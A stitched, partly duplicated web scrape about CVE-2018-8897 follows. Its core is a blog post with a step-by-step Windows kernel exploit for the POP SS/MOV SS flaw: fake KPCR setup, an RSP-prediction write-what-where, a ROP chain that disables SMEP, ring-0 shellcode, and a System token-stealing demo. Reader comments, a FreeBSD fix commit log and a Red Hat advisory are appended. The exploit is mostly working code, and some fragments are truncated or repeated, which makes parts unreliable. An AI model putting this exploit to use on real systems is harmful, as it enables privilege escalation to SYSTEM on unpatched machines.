  uint64_t IsrStackIterator = PredictedNextRsp - StackDelta - 0x38;

  // Unroll nested KiBreakpointTrap -> KiDebugTrapOrFault -> KiTrapDebugOrFault
  while (
    ( ( ISR_STACK* ) IsrStackIterator )->CS == 0x10 &&
    ( ( ISR_STACK* ) IsrStackIterator )->RIP > 0x7FFFFFFEFFFF )
  {

    __rollback_isr( IsrStackIterator );

    // We are @ KiBreakpointTrap -> KiDebugTrapOrFault, which won't follow the RSP Delta
    if ( ( ( ISR_STACK* ) ( IsrStackIterator + 0x30 ) )->CS == 0x33 )
    {
      /*

      fffff00e`d7a1bc80 000000ad39b6f938
      */
      IsrStackIterator = IsrStackIterator + 0x30;
      break;
    }

    IsrStackIterator -= StackDelta;
  }

  PVOID KStub = ( PVOID ) k_ExAllocatePool( 0ull, ( uint64_t )sizeof( IRetToVulnStub ) );
  Np_memcpy( KStub, IRetToVulnStub, sizeof( IRetToVulnStub ) );

  // ------ KERNEL CODE ------

  ....

  // ------ KERNEL CODE ------

  __swapgs();

  ( ( ISR_STACK* ) IsrStackIterator )->RIP += 1;
  ( fnIRetToVulnStub( KStub ) )( Cr4Old, IsrStackIterator, ContextBackup );
}
```

We can’t restore any registers so we will make the thread responsible for the execution of vulnerability store the context in a global container and restore from it instead. Now that we executed our code and returned to user-mode, our exploit is complete!

Let’s make a simple demo stealing the System token:

```
uint64_t SystemProcess = *k_PsInitialSystemProcess;
uint64_t CurrentProcess = k_PsGetCurrentProcess();

uint64_t CurrentToken = k_PsReferencePrimaryToken( CurrentProcess );
uint64_t SystemToken = k_PsReferencePrimaryToken( SystemProcess );

for ( int i = 0; i < 0x500; i += 0x8 )
{
  uint64_t Member = *( uint64_t * ) ( CurrentProcess + i );

  if ( ( Member & ~0xF ) == CurrentToken )
  {
    *( uint64_t * ) ( CurrentProcess + i ) = SystemToken;
    break;
  }
}

k_PsDereferencePrimaryToken( CurrentToken );
k_PsDereferencePrimaryToken( SystemToken );
```

   The exploit may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3.

   How did you debug it by “simulating” this situation？

   Please share the debugging method.

      To simply put:

      1) Load unsigned kernel driver

      2) Allocate memory for new GS

      3) Set debug registers using \_\_writedr

      4) swapgs

      5) Set gs base

      6) Access the break pointed memory and raise a #DB

      7) Debug and Profit.

      Perhaps just stack alignment?

         Thank you. It is stack alignment. I just find it in Intel Manual 6.14.2 64-Bit Mode Stack Frame.

   Thanks for your answer.

   Finally, I debug your code in the following steps:

   1. Windbg Kernel debug: ba e1 KiDebugTrapService (I use INT 2D instead of INT 3)

   Simulate the #DB event which should be created by movss

   2. Then in IDA remote gdb(connected VMWare debug stub): set rip to skip notify windbg the #DB event

   But in this way, the REAL\_TIME watchdog thread was hard to get scheduled. When I force to set the context pointer to point to the kernel stack, I can run to the kernel shell code by ROP.

      Hello, bro!

      I’m a newbee too. but I did some work about the CVE. I think maybe it is useful to you..

      <http://x86asm.net/articles/debugging-in-amd64-64-bit-mode-in-theory/> –> You could know some details about interrupts and exceptions, debug register. I think maybe you could read the article first. Because I think it is very useful.

      <https://www.bromium.com/dissecting-pop-ss-vulnerability/> –> You could get some details about the vulnerability…..I really think it is very useful…

      <https://github.com/nmulasmajic/CVE-2018-8897> –> POC from the finder.. I read it to know why the author know how to write EXP without any details..but I can’t.

      <http://everdox.net/popss.pdf> –> white paper.

      I’m sorry. My English is so terrible… ^\_^…….. .

   Hello, thanks for your work.!

   When I read your code from github, I could understand HANDLE(-2), I can’t understand that. The value must be -2?

   Maybe I’m not good at google…I can’t find any answer about the value “-2″….

   I’m sorry, my English is terrible…Looking forward to your reply!

         Hello, I’m sorry I always bother you…

         When I run your code. I find that that the instruction

         rdgsbase rax

         can’t work.(I run the instruction in windows 7(64bit) and I sure the mode is X64..)

         Then I run the instruction in windows 10(64bit), of course. The instruction work.

         And I want to find another instruction to replace it. so I read Ntoskrnl.exe. find the code in function which is named “PsGetCurrentProcess”

         .text:0000000140081D30 mov rax, gs:188h ; IoGetCurrentProcess

         .text:0000000140081D39 mov rax, [rax+70h]

         .text:0000000140081D3D retn

         I think maybe I can do something like this…

         lea rax, gs:188h(I know it won’t work… The instruction “mov rax, gs:00h” in visual won’t work too…)

         Could you give me some tips.. Thank you very much.

         And when I run your code. The code [i], [i+3],[i+7] , I think maybe it is lack of Versatility. I need to change the code like this and it will work.

         if (UPsGetCurrentProcess[i] == 0x48 && UPsGetCurrentProcess[i + 1] == 0x8B && // mov rax,

         UPsGetCurrentProcess[i + 4] == 0xC3) // retn

         {

         Offset\_KThread\_\_ApcStateFill\_\_Process = (0x70); //I find the offset is 0x70, so I change it directly.

         break;

         }

         Use number 4 instead of 7. I think have another method to run the code correctly in differcnt machines?

         I’m sorry….I try not to ask such a stupid question again.Thank U.

         I’m very sorry. I think maybe I get the answer from your github.

         “Discovered the problem while doing something completely unrelated, rdgsbase / wrgsbase is not supported in Windows 7 so this exploit will not work unless you overwrite TEB instead which is not what I’m doing in the PoC”

         I will try the mothods. Thank you!!!

# Arbitrary Code Execution at Ring 0 using CVE-2018-8897

![](https://blog.can.ac/wp-content/uploads/2020/04/EF49184E-56D7-4165-B4F3-A6F4E3798B7E-e1587490487648-110x110.jpg)[Can Bölük](https://blog.can.ac/author/can1357/ "Posts by Can Bölük")May 11, 2018[13](https://blog.can.ac/2018/05/11/arbitrary-code-execution-at-ring-0-using-cve-2018-8897/#comments)

Just a few days ago, a new vulnerability allowing an unprivileged user to run #DB handler with user-mode GSBASE was found by Nick Peterson ([@nickeverdox](https://twitter.com/nickeverdox)) and Nemanja Mulasmajic ([@0xNemi](https://twitter.com/0xNemi)). At the end of the whitepaper they published on [triplefault.io](http://triplefault.io), they mentioned that they were able to load and execute unsigned kernel code, which got me interested in the challenge; and that’s exactly what I’m going to attempt doing in this post.

Before starting, I would like to note that this exploit may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3. I debugged it by “simulating” this situation.

*Final source code can be found at the bottom.*

# 0x0: Setting Up the Basics

The fundamentals of this exploit is really simple unlike the exploitation of it. When stack segment is changed –whether via MOV or POP– until the next instruction completes interrupts are deferred. This is not a microcode bug but rather a feature added by Intel so that stack segment and stack pointer can get set at the same time.

However, many OS vendors missed this detail, which lets us raise a #DB exception as if it comes from CPL0 from user-mode.

We can create a deferred-to-CPL0 exception by setting debug registers in such a way that during the execution of stack-segment changing instruction a #DB will raise and calling *int 3* right after. int 3 will jump to KiBreakpointTrap, and before the first instruction of KiBreakpointTrap executes, our #DB will be raised.

As it is mentioned by the everdox and 0xNemi in the original whitepaper, this lets us run a kernel-mode exception handler with our user-mode GSBASE. Debug registers and XMM registers will also be persisted.

All of this can be done in a few lines like shown below:

```
#include <Windows.h>
#include <iostream>

void main()
{
  static DWORD g_SavedSS = 0;

  _asm
  {
    mov ax, ss
    mov word ptr [ g_SavedSS ], ax
  }

  CONTEXT Ctx = { 0 };
  Ctx.Dr0 = ( DWORD ) &g_SavedSS;
  Ctx.Dr7 = ( 0b1 << 0 ) | ( 0b11 << 16 ) | ( 0b11 << 18 );
  Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
  SetThreadContext( HANDLE( -2 ), &Ctx );

  PVOID FakeGsBase = ...;

  _asm
  {
    mov eax, FakeGsBase                     ; Set eax to fake gs base

    push 0x23
    push X64_End
    push 0x33
    push X64_Start
    retf

    X64_Start:
    __emit 0xf3								             ; wrgsbase eax
    __emit 0x0f
    __emit 0xae
    __emit 0xd8
    retf
    X64_End:

    ; Vulnerability
    mov ss, word ptr [ g_SavedSS ]			    ; Defer debug exception
    int 3                           		    ; Execute with interrupts disabled
    nop
  }
}
```

*This example is 32-bit for the sake of showing ASM and C together, the final working code will be 64-bit.*

Now let’s start debugging, we are in **KiDebugTrapOrFault** with our custom GSBASE! However, this is nothing but catastrophic, almost no function works and we will end up in a KiDebugTrapOrFault->KiGeneralProtectionFault->KiPageFault->KiPageFault->… infinite loop. If we had a perfectly valid GSBASE, the outcome of what we achieved so far would be a KMODE\_EXCEPTION\_NOT\_HANDLED BSOD**,** so let’s focus on making GSBASE function like the real one and try to get to KeBugCheckEx.

We can utilize a small IDA script to step to relevant parts faster:

```
#include <idc.idc>

static main()
{
  Message( "--- Step Till Next GS ---\n" );

  while( 1 )
  {
    auto Disasm = GetDisasmEx( GetEventEa(), 1 );
    if ( strstr( Disasm, "gs:" ) >= Disasm )
      break;
    StepInto();
    GetDebuggerEvent( WFNE_SUSP, -1 );
  }
}
```
# 0x1: Fixing the KPCR Data

Here are the few cases we have to modify GSBASE contents to pass through successfully:

### – KiDebugTrapOrFault

```
KiDebugTrapOrFault:
...
MEMORY:FFFFF8018C20701E ldmxcsr dword ptr gs:180h
```

Pcr.Prcb.MxCsr needs to have a valid combination of flags to pass this instruction or else it will raise a #GP. So let’s set it to its initial value, 0x1F80.

### – KiExceptionDispatch

```
KiExceptionDispatch:
...
MEMORY:FFFFF8018C20DB5F mov     rax, gs:188h
MEMORY:FFFFF8018C20DB68 bt      dword ptr [rax+74h], 8
```

Pcr.Prcb.CurrentThread is what resides in gs:188h. We are going to allocate a block of memory and reference it in gs:188h.

### – KiDispatchException

```
KiDispatchException:
...
MEMORY:FFFFF8018C12A4D8 mov     rax, gs:qword_188
MEMORY:FFFFF8018C12A4E1 mov     rax, [rax+0B8h]
```

This is Pcr.Prcb.CurrentThread.ApcStateFill.Process and again we are going to allocate a block of memory and simply make this pointer point to it.

```
KeCopyLastBranchInformation:
...
MEMORY:FFFFF8018C12A0AC mov     rax, gs:qword_20
MEMORY:FFFFF8018C12A0B5 mov     ecx, [rax+148h]
```

0x20 from GSBASE is Pcr.CurrentPrcb, which is simply Pcr + 0x180. Let’s set Pcr.CurrentPrcb to Pcr + 0x180 and also set Pcr.Self to &Pcr while on it.

### – RtlDispatchException

This one is going to be a little bit more detailed. RtlDispatchException calls RtlpGetStackLimits, which calls KeQueryCurrentStackInformation and *\_\_fastfail*s if it fails. The problem here is that KeQueryCurrentStackInformation checks the current value of RSP against Pcr.Prcb.RspBase, Pcr.Prcb.CurrentThread->InitialStack, Pcr.Prcb.IsrStack and if it doesn’t find a match it reports failure. We obviously cannot know the value of kernel stack from user-mode, so what to do?

There’s a weird check in the middle of the function:

```
char __fastcall KeQueryCurrentStackInformation(_DWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  ...
  if ( *(_QWORD *)(*MK_FP(__GS__, 392i64) + 40i64) == *MK_FP(__GS__, 424i64) )
  {
    ...
  }
  else
  {
    *v5 = 5;
    result = 1;
    *v3 = 0xFFFFFFFFFFFFFFFFi64;
    *v4 = 0xFFFF800000000000i64;
  }
  return result;
}
```

Thanks to this check, as long as we make sure KThread.InitialStack (KThread + 0x28) is not equal to Pcr.Prcb.RspBase (gs:1A8h) KeQueryCurrentStackInformation will return success with 0xFFFF800000000000-0xFFFFFFFFFFFFFFFF as the reported stack range. Let’s go ahead and set Pcr.Prcb.RspBase to 1 and Pcr.Prcb.CurrentThread->InitialStack to 0. Problem solved.

RtlDispatchException after these changes will fail without bugchecking and return to KiDispatchException.

### – KeBugCheckEx

We are finally here. Here’s the last thing we need to fix:

```
MEMORY:FFFFF8018C1FB94A mov     rcx, gs:qword_20
MEMORY:FFFFF8018C1FB953 mov     rcx, [rcx+62C0h]
MEMORY:FFFFF8018C1FB95A call    RtlCaptureContext
```

Pcr.CurrentPrcb->Context is where KeBugCheck saves the context of the caller and for some weird reason, it is a PCONTEXT instead of a CONTEXT. We don’t really care about any other fields of Pcr so let’s just set it to Pcr+ 0x3000 just for the sake of having a valid pointer for now.

# 0x2:  and Write|What|Where

And there we go, sweet sweet blue screen of victory!

![KMODE_EXCEPTION_NOT_HANDLED](https://blog.can.ac/wp-content/uploads/2018/05/okrUD.png)

Now that everything works, how can we exploit it?

The code after KeBugCheckEx is too complex to step in one by one and it is most likely not-so-fun to revert from so let’s try NOT to bugcheck this time.

I wrote another IDA script to log the points of interest (such as gs: accesses and jumps and calls to registers and [registers+x]) and made it step until  KeBugCheckEx is hit:

```
#include <idc.idc>

static main()
{
  Message( "--- Logging Points of Interest ---\n" );

  while( 1 )
  {
    auto IP = GetEventEa();
    auto Disasm = GetDisasmEx( IP, 1 );

    if
    (
      ( strstr( Disasm, "gs:" ) >= Disasm ) ||
      ( strstr( Disasm, "jmp r" ) >= Disasm ) ||
      ( strstr( Disasm, "call r" ) >= Disasm ) ||
      ( strstr( Disasm, "jmp" ) >= Disasm && strstr( Disasm, "[r" ) >= Disasm ) ||
      ( strstr( Disasm, "call" ) >= Disasm && strstr( Disasm, "[r" ) >= Disasm )
    )
    {
    Message( "-- %s (+%x): %s\n", GetFunctionName( IP ), IP - GetFunctionAttr( IP, FUNCATTR_START ), Disasm );
    }

    StepInto();
    GetDebuggerEvent( WFNE_SUSP, -1 );

    if( IP == ... )
    break;
  }
}

```

To my disappointment, there is no convenient jumps or calls. The whole output is:

```
- KiDebugTrapOrFault (+3d):                   test    word ptr gs:278h, 40h
- sub_FFFFF8018C207019 (+5):                  ldmxcsr dword ptr gs:180h
-- KiExceptionDispatch (+5f):                 mov     rax, gs:188h

--- KiDispatchException (+5c):                inc     gs:5D30h

--- KeBugCheckEx (+1a):                       mov     rcx, gs:20h
```

This means that we have to find a way to write to kernel-mode memory and abuse that instead. RtlCaptureContext will be a tremendous help here. As I mentioned before, it is taking the context pointer from Pcr.CurrentPrcb->Context, which is weirdly a **PCONTEXT Context** and not a **CONTEXT Context**, meaning we can supply it any kernel address and make it write the context over it.

I was originally going to make it write over g\_CiOptions and continuously NtLoadDriver in another thread, but this idea did not work as well as I thought (That being said, appearently this is the way [@0xNemi](https://twitter.com/0xNemi) and [@nickeverdox](https://twitter.com/nickeverdox) got it working. I guess we will see what dark magic they used at BlackHat 2018.) simply because the current thread is stuck in an infinite loop and the other thread trying to NtLoadDriver will not succeed because of the IPI it uses:

> NtLoadDriver->…->MiSetProtectionOnSection->KeFlushMultipleRangeTb->IPI->Deadlock

After playing around with g\_CiOptions for 1-2 days, I thought of a much better idea: overwriting the return address of RtlCaptureContext.

How are we going to overwrite the return address without having access to RSP? If we use a little bit of creativity, we actually can have access to RSP. We can get the current RSP by making Prcb.Context point to a user-mode memory and polling Context.RSP value from a secondary thread. Sadly, this is not useful by itself as we already passed RtlCaptureContext (our write what where exploit).

However, if we could return back to KiDebugTrapOrFault after RtlCaptureContext finishes its work and somehow predict the next value of RSP, this would be extremely abusable; which is exactly what we are going to do.

To return back to KiDebugTrapOrFault, we will again use our lovely debug registers. Right after RtlCaptureContext returns, a call to KiSaveProcessorControlState is made.

```

.text:0000000140175C9F                 mov     [rcx+0A0h], rax
```

We will set DR1 on gs:20h + 0x100 + 0xA0, and make KeBugCheckEx return back to KiDebugTrapOrFault just after it saves the value of CR4.

To overwrite the return pointer, we will first let KiDebugTrapOrFault->…->RtlCaptureContext execute once giving our user-mode thread an initial RSP value, then we will let it execute another time to get the new RSP, which will let us calculate per-execution RSP difference. This RSP delta will be constant because the control flow is also constant.

Now that we have our RSP delta, we will predict the next value of RSP, subtract 8 from that to calculate the return pointer of RtlCaptureContext and make Prcb.Context->Xmm13 – Prcb.Context->Xmm15 written over it.

Thread logic will be like the following:

```
volatile PCONTEXT Ctx = *( volatile PCONTEXT* ) ( Prcb + Offset_Prcb__Context );

while ( !Ctx->Rsp );											                // Wait for RtlCaptureContext to be called once so we get leaked RSP
uint64_t StackInitial = Ctx->Rsp;
while ( Ctx->Rsp == StackInitial );								       // Wait for it to be called another time so we get the stack pointer difference
                                                          // between sequential KiDebugTrapOrFault
StackDelta = Ctx->Rsp - StackInitial;
PredictedNextRsp = Ctx->Rsp + StackDelta;						     // Predict next RSP value when RtlCaptureContext is called
uint64_t NextRetPtrStorage = PredictedNextRsp - 0x8;			// Predict where the return pointer will be located at
NextRetPtrStorage &= ~0xF;
*( uint64_t* ) ( Prcb + Offset_Prcb__Context ) = NextRetPtrStorage - Offset_Context__XMM13;
                                                          // Make RtlCaptureContext write XMM13-XMM15 over it
```

Now we simply need to set-up a ROP chain and write it to XMM13-XMM15. We cannot predict which half of XMM15 will get hit due to the mask we apply to comply with the movaps alignment requirement, so first two pointers should simply point at a [RETN] instruction.

We need to load a register with a value we choose to set CR4 so XMM14 will point at a [POP RCX; RETN] gadget, followed by a valid CR4 value with SMEP disabled. As for XMM13, we are simply going to use a [MOV CR4, RCX; RETN;] gadget followed by a pointer to our shellcode.

The final chain will look something like:

```
-- &retn;                (fffff80372e9502d)
-- &retn;                (fffff80372e9502d)
-- &pop rcx; retn;       (fffff80372ed9122)
-- cr4_nosmep            (00000000000506f8)
-- &mov cr4, rcx; retn;  (fffff803730045c7)
-- &KernelShellcode      (00007ff613fb1010)
```

In our shellcode, we will need to restore the CR4 value, swapgs, rollback ISR stack, execute the code we want and IRETQ back to user-mode which can be done like below:

```
NON_PAGED_DATA fnFreeCall k_ExAllocatePool = 0;

using fnIRetToVulnStub = void( * )  ( uint64_t Cr4, uint64_t IsrStack, PVOID ContextBackup );
NON_PAGED_DATA BYTE IRetToVulnStub[] =

  0x4C, 0x89, 0xC1,		// mov rcx, r8  ; rcx = ContextBackup
  0xFB,				        // sti          ; enable interrupts
  0x48, 0xCF			     // iretq        ; interrupt return
};

NON_PAGED_CODE void KernelShellcode()
{
  __writedr( 7, 0 );

  uint64_t Cr4Old = __readgsqword( Offset_Pcr__Prcb + Offset_Prcb__Cr4 );
  __writecr4( Cr4Old & ~( 1 << 20 ) );

  __swapgs();

  uint64_t IsrStackIterator = PredictedNextRsp - StackDelta - 0x38;

  // Unroll nested KiBreakpointTrap -> KiDebugTrapOrFault -> KiTrapDebugOrFault
  while (

    ( ( ISR_STACK* ) IsrStackIterator )->RIP > 0x7FFFFFFEFFFF )
  {

    __rollback_isr( IsrStackIterator );

    // We are @ KiBreakpointTrap -> KiDebugTrapOrFault, which won't follow the RSP Delta
    if ( ( ( ISR_STACK* ) ( IsrStackIterator + 0x30 ) )->CS == 0x33 )
    {
      /*

      */
      IsrStackIterator = IsrStackIterator + 0x30;
      break;
    }

    IsrStackIterator -= StackDelta;
  }

  PVOID KStub = ( PVOID ) k_ExAllocatePool( 0ull, ( uint64_t )sizeof( IRetToVulnStub ) );
  Np_memcpy( KStub, IRetToVulnStub, sizeof( IRetToVulnStub ) );

  // ------ KERNEL CODE ------

  // ------ KERNEL CODE ------

  __swapgs();

  ( ( ISR_STACK* ) IsrStackIterator )->RIP += 1;
  ( fnIRetToVulnStub( KStub ) )( Cr4Old, IsrStackIterator, ContextBackup );
}
```

We can’t restore any registers so we will make the thread responsible for the execution of vulnerability store the context in a global container and restore from it instead. Now that we executed our code and returned to user-mode, our exploit is complete!

Let’s make a simple demo stealing the System token:

```
uint64_t SystemProcess = *k_PsInitialSystemProcess;
uint64_t CurrentProcess = k_PsGetCurrentProcess();

uint64_t CurrentToken = k_PsReferencePrimaryToken( CurrentProcess );
uint64_t SystemToken = k_PsReferencePrimaryToken( SystemProcess );

for ( int i = 0; i < 0x500; i += 0x8 )
{
  uint64_t Member = *( uint64_t * ) ( CurrentProcess + i );

  if ( ( Member & ~0xF ) == CurrentToken )
  {
    *( uint64_t * ) ( CurrentProcess + i ) = SystemToken;
    break;
  }
}

k_PsDereferencePrimaryToken( CurrentToken );
k_PsDereferencePrimaryToken( SystemToken );
```

   The exploit may not work with certain hypervisors (like VMWare), which discard the pending #DB after INT3.

   How did you debug it by “simulating” this situation？

   Please share the debugging method.

      To simply put:

      1) Load unsigned kernel driver

      2) Allocate memory for new GS

      3) Set debug registers using \_\_writedr

      4) swapgs

      5) Set gs base

      6) Access the break pointed memory and raise a #DB

      7) Debug and Profit.

      Perhaps just stack alignment?

         Thank you. It is stack alignment. I just find it in Intel Manual 6.14.2 64-Bit Mode Stack Frame.

   Thanks for your answer.

   Finally, I debug your code in the following steps:

   1. Windbg Kernel debug: ba e1 KiDebugTrapService (I use INT 2D instead of INT 3)

   Simulate the #DB event which should be created by movss

   2. Then in IDA remote gdb(connected VMWare debug stub): set rip to skip notify windbg the #DB event

   But in this way, the REAL\_TIME watchdog thread was hard to get scheduled. When I force to set the context pointer to point to the kernel stack, I can run to the kernel shell code by ROP.

      Hello, bro!

      I’m a newbee too. but I did some work about the CVE. I think maybe it is useful to you..

      <http://x86asm.net/articles/debugging-in-amd64-64-bit-mode-in-theory/> –> You could know some details about interrupts and exceptions, debug register. I think maybe you could read the article first. Because I think it is very useful.

      <https://www.bromium.com/dissecting-pop-ss-vulnerability/> –> You could get some details about the vulnerability…..I really think it is very useful…

      <https://github.com/nmulasmajic/CVE-2018-8897> –> POC from the finder.. I read it to know why the author know how to write EXP without any details..but I can’t.

      <http://everdox.net/popss.pdf> –> white paper.

      I’m sorry. My English is so terrible… ^\_^…….. .

   Hello, thanks for your work.!

   When I read your code from github, I could understand HANDLE(-2), I can’t understand that. The value must be -2?

   Maybe I’m not good at google…I can’t find any answer about the value “-2″….

   I’m sorry, my English is terrible…Looking forward to your reply!

         Hello, I’m sorry I always bother you…

         When I run your code. I find that that the instruction

         rdgsbase rax

         can’t work.(I run the instruction in windows 7(64bit) and I sure the mode is X64..)

         Then I run the instruction in windows 10(64bit), of course. The instruction work.

         And I want to find another instruction to replace it. so I read Ntoskrnl.exe. find the code in function which is named “PsGetCurrentProcess”

         .text:0000000140081D30 mov rax, gs:188h ; IoGetCurrentProcess

         .text:0000000140081D39 mov rax, [rax+70h]

         .text:0000000140081D3D retn

         I think maybe I can do something like this…

         lea rax, gs:188h(I know it won’t work… The instruction “mov rax, gs:00h” in visual won’t work too…)

         Could you give me some tips.. Thank you very much.

         And when I run your code. The code [i], [i+3],[i+7] , I think maybe it is lack of Versatility. I need to change the code like this and it will work.

         if (UPsGetCurrentProcess[i] == 0x48 && UPsGetCurrentProcess[i + 1] == 0x8B && // mov rax,

         UPsGetCurrentProcess[i + 4] == 0xC3) // retn

         {

         Offset\_KThread\_\_ApcStateFill\_\_Process = (0x70); //I find the offset is 0x70, so I change it directly.

         break;

         }

         Use number 4 instead of 7. I think have another method to run the code correctly in differcnt machines?

         I’m sorry….I try not to ask such a stupid question again.Thank U.

         I’m very sorry. I think maybe I get the answer from your github.

         “Discovered the problem while doing something completely unrelated, rdgsbase / wrgsbase is not supported in Windows 7 so this exploit will not work unless you overwrite TEB instead which is not what I’m doing in the PoC”

         I will try the mothods. Thank you!!!

| Log Message: | ``` Prepare DB# handler for deferred trigger of watchpoints.  Since pop %ss/mov %ss instructions defer all interrupts and exceptions for the next instruction, it is possible that the userspace watchpoint trap executes on the first instruction of the kernel entry for syscall/bpt.  In this case, DB# should be treated similarly to NMI: on amd64 we must always load GSBASE even if the trap comes from kernel mode, and load the kernel page table root into %cr3.  Moreover, the trap must use the dedicated stack, because we are still on the user stack when trapped on syscall entry.  For i386, we must reload %cr3.  The syscall instruction is not configured, so there is no issue with executing on user stack when trapping.  Due to some CPU erratas it is not always possible to detect that the userspace watchpoint triggered by inspecting %dr6.  In trap(), compare the trap %rip with the known unsafe entry points and if matched pretend that the watchpoint did not fire at all.  Thank you to the MSRC Incident Response Team, and in particular Greg Lenti and Nate Warfield, for coordinating the response to this issue across multiple vendors.  Thanks to Computer Recycling at The Working Center of Kitchener for making hardware available to allow us to test the patch on additional CPU families.

### Insights vulnerability analysis

[View exposed systems](https://console.redhat.com/insights/vulnerability/cves/CVE-2018-8897)

* Overview
* Impact
* Diagnose
* Resolve

Red Hat has been made aware of a flaw in the way the Linux kernel handles exceptions triggered after the POP SS and MOV to SS instructions.  These issues could lead to denial of service for unpatched systems.

These instructions hold delivery of interrupts, data breakpoints, and single step trap exceptions until the instruction boundary following the next instruction. Separate issues are identified as related to the Linux kernel and KVM technologies.

## Background Information

Modern processors provide debugging infrastructure, used by system designers and application developers to debug their software. It includes set of debug registers (DR0...DR7) and other Machine Specific Registers (MSRs). A user can configure these registers to monitor events, including memory access (read or write), instruction execution and I/O port access. When such an event occurs during program execution, the processor raises a Debug Exception (#DB) to transfer execution control to debugging software (for example,  gdb).  This catches the debug exception and allows a developer to examine program execution state. For example, to monitor read/write memory access at address ‘0x4007c7’, the user stores address ‘0x4007c7’ in one of the debug registers DR0...DR3, and the processor raises #DB when memory location ‘0x4007c7’ is accessed during program execution. Such addressing in the debug register is called Breakpoint.

Mov %DR0, 0x4007c7

Generally, exceptions are raised at the instruction boundary; all instructions before the one causing the exception are allowed to complete and the one causing the exception is stalled, so that it can resume execution once the exception has been handled. In a few instances where the instruction causes a task switch or stack switch, these exceptions are raised after the instruction; notably, the instruction causing the exception is allowed to complete, as happens with MOV SS or POP SS.

Red Hat Product Security has rated the kernel issue ([CVE-2018-8897](http://access.redhat.com/security/cve/cve-2018-8897)) as having a security impact of [Moderate](https://access.redhat.com/security/updates/classification/).

Red Hat Product Security has rated the KVM issue ([CVE-2018-1087](http://access.redhat.com/security/cve/cve-2018-1087)) as having security impact of [Important](https://access.redhat.com/security/updates/classification/).

The following Red Hat product versions are impacted:

* Red Hat Enterprise Linux 5
* Red Hat Enterprise Linux 6
* Red Hat Enterprise Linux 7
* Red Hat Enterprise Linux Atomic Host
* Red Hat Enterprise MRG 2
* Red Hat Virtualization Hypervisor 4
* Red Hat Enterprise Virtualization Hypervisor 3

## Attack Description

Typical stack switching involves two operations: one to load the stack segment selector (SS) register, and another to set the stack pointer register (RSP), for example:

Mov SS, [RAX]
        Mov RSP, RBP

When switching stack via MOV SS (OR POP SS) instructions as depicted  above, the processor stalls delivery of all interrupts and debug exceptions (#DB). This is due to the fact that if an exception were to occur after the Segment Selector (SS) register had been loaded (but before the Stack Pointer (RSP) registers is positioned properly), the interrupt handler would see an invalid stack state. Thus, the processor delivers pending interrupts and/or debug exceptions after the first instruction following when the stack switch is executed.

Now consider that a Breakpoint was set on the memory location ([RAX] above) accessed by the Mov SS instruction during the stack switch. This Breakpoint will generate a Breakpoint Exception (#BP) after the stack switch. Now if the first instruction after the stack switch happens to be one which changes the current privilege level (CPL < 3), like SYSCALL, SYSENTER, INT3 etc., then the delayed Breakpoint Exception (#BP) from above is delivered in the kernel space, thus potentially resulting in privilege escalation.

For the Linux kernel's KVM hypervisor, during the stack switch operation, the processor did not deliver interrupts and exceptions, rather they are delivered once the first instruction after the stack switch is executed. An unprivileged KVM guest user could use this flaw to crash the guest or, potentially, escalate their privileges in the guest.

While Red Hat's Linux Containers are not directly impacted by kernel issues, their security relies upon the integrity of the host kernel environment. Red Hat recommends that you use the most recent versions of your container images. The Container Health Index, part of the Red Hat Container Catalog, can always be used to verify the security status of Red Hat containers. To protect the containers in use, you will need to ensure that the Container host has been updated against these attacks. Red Hat has released an updated Atomic Host for this use case.

## Mitigation

There is no known mitigation, other than applying vendor software updates.
